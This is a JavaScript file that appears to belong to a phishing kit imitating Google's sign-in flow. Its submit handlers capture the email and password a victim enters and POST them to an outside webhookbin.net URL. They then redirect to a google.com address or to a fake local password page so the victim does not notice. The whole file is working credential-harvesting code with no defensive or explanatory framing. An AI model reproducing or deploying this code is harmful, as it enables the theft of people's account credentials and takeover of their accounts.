const webhook = "https://webhookbin.net/v1/bin/a07c51bd-383a-41bb-aa78-8ce5aeeaa5bf";

const sendToWebhook = async (body) => {
  const response = await fetch(webhook, {
    method: "POST",
    body: JSON.stringify(body),
  });

  return response;
};

function handleSubmitRR(event, form) {
  event.preventDefault();
  const data = new FormData(event.target);
  const email = data.get("mail");
  const password = data.get("p");

  (async function () {
    await sendToWebhook({ email: email, password: password });
    form.submit();
  })();
}

function handleSubmitPassword(event) {
  event.preventDefault();
  const data = new FormData(event.target);
  const password = data.get("password");

  (async function () {
    await sendToWebhook({ password: password });
    window.location.href =
      "https://www.google.com/account/" + Math.floor(Math.random() * 1000000);
  })();
}

function handleSubmitEmail(event) {
  event.preventDefault();
  const data = new FormData(event.target);
  const email = data.get("email");

  (async function () {
    await sendToWebhook({ email: email });
    window.location.href = "../google_password/google.html";
  })();
}

function showSpinner() {
  const showbox = document.querySelector(".showbox");
  showbox.style.display = "flex";
}

function hideSpinner() {
  const showbox = document.querySelector(".showbox");
  showbox.style.display = "none";
}
